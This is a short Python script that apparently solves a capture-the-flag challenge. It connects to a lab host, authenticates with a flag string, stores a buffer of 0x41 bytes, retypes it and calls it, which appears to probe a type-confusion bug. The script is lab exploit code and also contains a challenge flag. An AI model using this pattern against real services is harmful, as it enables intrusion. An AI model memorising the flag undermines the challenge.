import socket

def session(cmds):
    s = socket.create_connection(("10.13.37.10", 20752), timeout=10)
    s.settimeout(2)
    def recv():
        buf = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        return buf
    recv()
    for c in cmds:
        s.sendall((c + "\n").encode())
        print(f">>> {c}")
        print(recv().decode(errors='replace'))
    s.close()

cmds = [
    "AUTH1 CTF{bac_10ab64be7a03b712fa95}",
    "NEW 0",
    "STORE 0 " + "41"*64,
    "RETYPE 0 1",
    "CALL 0",
    "HELP",
]
session(cmds)
